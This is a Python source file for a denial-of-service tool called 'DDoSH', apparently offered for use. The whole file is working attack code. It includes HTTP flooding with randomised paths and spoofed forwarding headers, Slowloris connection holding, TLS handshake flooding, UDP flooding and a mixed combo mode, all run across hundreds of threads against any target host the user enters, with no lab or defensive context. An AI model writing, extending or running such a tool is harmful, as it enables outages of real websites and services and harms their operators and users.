#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║             DDoSH - Tool v3.1                                ║
║             created by BH                                    ║
╚══════════════════════════════════════════════════════════════╝

Usage: python ddos.py [host] [port] [threads] [mode] [duration]

Modes: http | slowris | tls | udp | combo | auto
"""

import sys
import socket
import ssl
import random
import threading
import time
import os
import hashlib
import json
import struct

# ============================================================
# DEFAULTS
# ============================================================
TARGET_HOST = ""
TARGET_PORT = 443
THREAD_COUNT = 600
DURATION = 0
USE_SSL = True
MODE = "auto"
PROXY_LIST = []

# ============================================================
# HEADER GENERATORS
# ============================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "curl/8.6.0",
    "PostmanRuntime/7.37.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.165 Mobile Safari/537.36"
]

PATHS = [
    "/", "/api", "/api/v1", "/api/v2", "/graphql", "/rest", "/login",
    "/admin", "/wp-admin", "/wp-login.php", "/xmlrpc.php", "/index.php",
    "/home", "/products", "/search", "/blog", "/contact", "/about",
    "/assets/js/app.js", "/assets/css/style.css", "/favicon.ico",
    "/robots.txt", "/sitemap.xml", "/.env", "/config", "/backup",
    "/api/health", "/api/status", "/api/users", "/api/data",
    "/api/search", "/api/auth", "/api/token", "/api/refresh",
    "/swagger", "/api-docs", "/docs", "/v1/data", "/v2/data",
    "/static", "/uploads", "/download", "/media", "/images",
    "/account", "/profile", "/settings", "/dashboard",
    "/checkout", "/cart", "/orders", "/payment"
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/",
    "https://t.co/", "https://l.facebook.com/",
    "https://googleads.g.doubleclick.net/",
    "https://www.reddit.com/", "https://github.com/",
    "https://stackoverflow.com/", "https://yandex.com/",
    "https://duckduckgo.com/"
]

def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def build_req(host, port):
    path = random.choice(PATHS)
    if random.random() < 0.4:
        path += f"?_{random.randint(10000, 99999)}={random.randint(1, 999)}"
    
    method = "GET" if random.random() < 0.8 else random.choice(["POST", "HEAD", "OPTIONS"])
    ua = random.choice(USER_AGENTS)
    ref = random.choice(REFERERS)
    
    hdrs = [
        f"{method} {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {ua}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9,fa;q=0.7,ar;q=0.3",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        "Cache-Control: no-cache, no-store, must-revalidate",
        "Pragma: no-cache",
        "DNT: 1",
        "Upgrade-Insecure-Requests: 1",
        f"X-Forwarded-For: {rand_ip()}",
        f"X-Real-IP: {rand_ip()}"
    ]
    
    if ref:
        hdrs.append(f"Referer: {ref}")
    if random.random() < 0.5:
        hdrs.append(f"Cookie: session={hashlib.md5(str(random.random()).encode()).hexdigest()};")
    
    body = ""
    if method == "POST":
        body = f"data={hashlib.md5(str(random.random()).encode()).hexdigest()}"
        hdrs.append(f"Content-Type: application/x-www-form-urlencoded")
        hdrs.append(f"Content-Length: {len(body)}")
    
    return "\r\n".join(hdrs).encode() + b"\r\n\r\n" + body.encode()


# ============================================================
# ATTACK ENGINES
# ============================================================
def http_flood(host, port, ssl_on, delay, stop, stats):
    while not stop.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = ctx.wrap_socket(sock, server_hostname=host)
            else:
                conn = sock
            
            conn.connect((host, port))
            
            n = random.randint(1, 4)
            for _ in range(n):
                if stop.is_set():
                    break
                req = build_req(host, port)
                conn.sendall(req)
                stats["sent"] += 1
                if delay > 0:
                    time.sleep(delay + random.uniform(0, delay))
            
            try:
                conn.settimeout(0.3)
                conn.recv(1024)
            except:
                pass
            
            conn.close()
        except:
            stats["errors"] += 1
            time.sleep(0.2)


def slowloris(host, port, ssl_on, delay, stop, stats):
    while not stop.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(60)
            
            if ssl_on:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                conn = ctx.wrap_socket(sock, server_hostname=host)
            else:
                conn = sock
            
            conn.connect((host, port))
            path = random.choice(PATHS)
            conn.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
            
            i = 0
            max_h = random.randint(50, 200)
            while i < max_h and not stop.is_set():
                h = f"X-{random.randint(1, 9999)}: {hashlib.md5(str(random.random()).encode()).hexdigest()}\r\n"
                try:
                    conn.sendall(h.encode())
                    i += 1
                    stats["sent"] += 1
                    time.sleep(random.uniform(2, 10))
                except:
                    break
            
            conn.close()
        except:
            stats["errors"] += 1
            time.sleep(2)


def tls_flood(host, port, delay, stop, stats):
    while not stop.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((host, port))
            
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_ciphers(random.choice([
                "AES256-GCM-SHA384:AES128-GCM-SHA256",
                "ECDHE-RSA-AES256-GCM-SHA384",
                "ECDHE+AESGCM:ECDHE+CHACHA20"
            ]))
            
            conn = ctx.wrap_socket(sock, server_hostname=host)
            conn.do_handshake()
            stats["sent"] += 1
            
            # Keep alive to hold resources
            time.sleep(random.uniform(1, 5))
            conn.close()
        except:
            stats["errors"] += 1
            time.sleep(0.3)


def udp_flood(host, port, delay, stop, stats):
    while not stop.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = os.urandom(random.randint(128, 1400))
            sock.sendto(payload, (host, port))
            stats["sent"] += 1
            time.sleep(random.uniform(0, 0.005))
            sock.close()
        except:
            stats["errors"] += 1


def combo_attack(host, port, ssl_on, delay, stop, stats):
    engines = [http_flood, slowloris, tls_flood, udp_flood]
    while not stop.is_set():
        e = random.choice(engines)
        try:
            if e is tls_flood or e is udp_flood:
                e(host, port, 0, stop, stats)
            else:
                e(host, port, ssl_on, random.uniform(0, 0.02), stop, stats)
        except:
            pass


# ============================================================
# UI
# ============================================================
def show_banner():
    os.system("clear" if os.name == "posix" else "cls")
    b = []
    b.append("\033[36m")
    b.append("  ╔════════════════════════════════════════╗")
    b.append("  ║                                        ║")
    b.append("  ║    ██████╗ ██████╗  ██████╗ ███████╗   ║")
    b.append("  ║    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝   ║")
    b.append("  ║    ██║  ██║██║  ██║██║   ██║███████╗   ║")
    b.append("  ║    ██║  ██║██║  ██║██║   ██║╚════██║   ║")
    b.append("  ║    ██████╔╝██████╔╝╚██████╔╝███████║   ║")
    b.append("  ║    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝   ║")
    b.append("  ║                                        ║")
    b.append("  ║       created by BH                    ║")
    b.append("  ╚════════════════════════════════════════╝")
    b.append("\033[0m")
    print("\n".join(b))


def show_stats(stats, start, stop):
    while not stop.is_set():
        e = time.time() - start
        s = stats["sent"]
        er = stats["errors"]
        r = s / e if e > 0 else 0
        bw = (r * 800 * 8) / (1024 * 1024) if r > 0 else 0
        sys.stdout.write(f"\r\033[K\033[36m[*]\033[0m Sent: \033[93m{s:,}\033[0m | "
                         f"Errors: \033[91m{er:,}\033[0m | "
                         f"Rate: \033[92m{r:,.0f}\033[0m/s | "
                         f"BW: \033[94m{bw:.1f} Mbps\033[0m | "
                         f"Time: \033[95m{e:.0f}s\033[0m")
        sys.stdout.flush()
        time.sleep(2)


# ============================================================
# MAIN
# ============================================================
def main():
    global TARGET_HOST, TARGET_PORT, THREAD_COUNT, DURATION, USE_SSL, MODE
    
    # Parse CLI args
    args = sys.argv[1:]
    if len(args) >= 1:
        TARGET_HOST = args[0]
    if len(args) >= 2:
        TARGET_PORT = int(args[1])
    if len(args) >= 3:
        THREAD_COUNT = int(args[2])
    if len(args) >= 4:
        MODE = args[3]
    if len(args) >= 5:
        DURATION = int(args[4])
    
    show_banner()
    
    # Interactive mode
    if not TARGET_HOST:
        TARGET_HOST = input("\033[33m[?]\033[0m Target Host: ").strip()
        if not TARGET_HOST:
            print("\033[31m[!]\033[0m No target.")
            return
    
    if len(args) < 2:
        p = input(f"\033[33m[?]\033[0m Port [{TARGET_PORT}]: ").strip()
        if p:
            TARGET_PORT = int(p)
    
    if len(args) < 4:
        ssl_in = input(f"\033[33m[?]\033[0m Use SSL? (Y/n): ").strip().lower()
        USE_SSL = ssl_in != "n"
        
        print("\n\033[36m[*]\033[0m Modes: 1)HTTP  2)SLOWLORIS  3)TLS  4)UDP  5)COMBO  6)AUTO")
        m = input(f"\033[33m[?]\033[0m Mode [6]: ").strip()
        mode_map = {"1":"http","2":"slowris","3":"tls","4":"udp","5":"combo","6":"auto","":"auto"}
        MODE = mode_map.get(m, "auto")
    
    if len(args) < 3:
        t = input(f"\033[33m[?]\033[0m Threads [{THREAD_COUNT}]: ").strip()
        if t:
            THREAD_COUNT = int(t)
    
    if len(args) < 5:
        d = input(f"\033[33m[?]\033[0m Duration (0=unlimited) [0]: ").strip()
        if d:
            DURATION = int(d)
    
    # Auto mode
    if MODE == "auto":
        if TARGET_PORT in (80, 8080, 8000):
            MODE = "http"
            USE_SSL = False
        elif TARGET_PORT in (443, 8443):
            MODE = "combo"
            USE_SSL = True
        else:
            MODE = "udp"
    
    # Resolve
    try:
        ip = socket.gethostbyname(TARGET_HOST)
        print(f"\n\033[32m[+]\033[0m {TARGET_HOST} -> {ip}")
    except:
        ip = TARGET_HOST
        print(f"\n\033[33m[!]\033[0m Cannot resolve, using: {ip}")
    
    engines = {
        "http": http_flood,
        "slowris": slowloris,
        "tls": tls_flood,
        "udp": udp_flood,
        "combo": combo_attack
    }
    engine = engines.get(MODE, http_flood)
    
    print(f"\033[36m[*]\033[0m Mode: {MODE.upper()} | Threads: {THREAD_COUNT} | SSL: {USE_SSL}")
    print(f"\033[36m[*]\033[0m Press \033[91mCtrl+C\033[0m to stop\n")
    
    stats = {"sent": 0, "errors": 0}
    stop = threading.Event()
    start = time.time()
    
    # Stats thread
    t_stat = threading.Thread(target=show_stats, args=(stats, start, stop), daemon=True)
    t_stat.start()
    
    # Workers
    threads = []
    for _ in range(THREAD_COUNT):
        if engine in (tls_flood, udp_flood):
            t = threading.Thread(target=engine, args=(TARGET_HOST, TARGET_PORT, 0, stop, stats), daemon=True)
        else:
            delay = 0.01 if MODE != "slowris" else 0
            t = threading.Thread(target=engine, args=(TARGET_HOST, TARGET_PORT, USE_SSL, delay, stop, stats), daemon=True)
        t.start()
        threads.append(t)
    
    try:
        if DURATION > 0:
            time.sleep(DURATION)
            stop.set()
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[31m[!]\033[0m Stopping...")
        stop.set()
    
    elapsed = time.time() - start
    rate = stats["sent"] / elapsed if elapsed > 0 else 0
    print(f"\n\n\033[36m[+]\033[0m Complete: {stats['sent']:,} sent | "
          f"{stats['errors']:,} errors | "
          f"{rate:,.0f}/s avg | "
          f"{elapsed:.0f}s elapsed\033[0m")


if __name__ == "__main__":
    main()